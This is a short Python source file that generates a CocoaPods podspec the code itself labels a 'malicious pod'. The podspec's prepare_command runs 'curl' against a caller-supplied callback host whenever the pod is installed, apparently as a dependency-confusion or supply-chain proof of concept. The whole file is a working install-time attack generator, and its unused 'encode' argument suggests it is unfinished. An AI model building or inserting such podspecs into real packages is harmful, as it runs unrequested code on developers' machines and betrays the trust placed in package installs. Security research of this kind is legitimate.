"""Generate Ruby podspec payload for CocoaPods."""
from __future__ import annotations

from typing import Optional


def generate(package: str, callback: str, encode: Optional[str] = None) -> str:
    """Return a minimal podspec executing ``callback`` on install."""
    cmd = f"curl -m5 {callback}"
    return (
        "Pod::Spec.new do |s|\n"
        f"  s.name = '{package}'\n"
        "  s.version = '0.0.1'\n"
        "  s.summary = 'malicious pod'\n"
        f"  s.prepare_command = '{cmd}'\nend\n"
    )
